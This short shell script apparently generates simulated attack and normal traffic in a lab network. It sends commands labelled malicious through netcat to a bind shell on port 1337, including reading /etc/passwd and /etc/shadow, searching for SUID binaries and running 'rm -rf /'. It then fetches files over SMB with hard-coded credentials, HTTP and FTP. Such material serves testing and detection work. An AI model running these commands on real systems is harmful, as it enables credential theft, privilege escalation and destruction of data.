STARTUP_DELAY=10
CMD_DELAY=1

sleep $STARTUP_DELAY

# send malicious commands via the bind shell
(
echo "whoami"
sleep $CMD_DELAY
echo "id"
sleep $CMD_DELAY
echo "pwd"
sleep $CMD_DELAY
echo "ls -al /"
sleep $CMD_DELAY
echo "cat /etc/passwd"
sleep $CMD_DELAY
echo "cat /etc/shadow"
sleep $CMD_DELAY
echo "find / -perm /4000"
sleep $CMD_DELAY
echo "rm -rf /"
sleep $CMD_DELAY
) | nc bindshell 1337

# connect to smb and download files
files=$(cat /scripts/assets.lst | sed 's/\//\\/g' | awk '{print("get " $0)}')
smbclient -U lucas%pass \\\\smb\\public << EOF
help
ls
recurse on
"$files"
exit
EOF

# Interact with HTTP server
curl -s http://nginx/ -o /dev/null
cat /scripts/assets.lst | while read line
do
  curl -s http://nginx/$line -o /dev/null
done

# Iteract with ftp server
wget --recursive ftp://alpineftp:alpineftp@ftpd

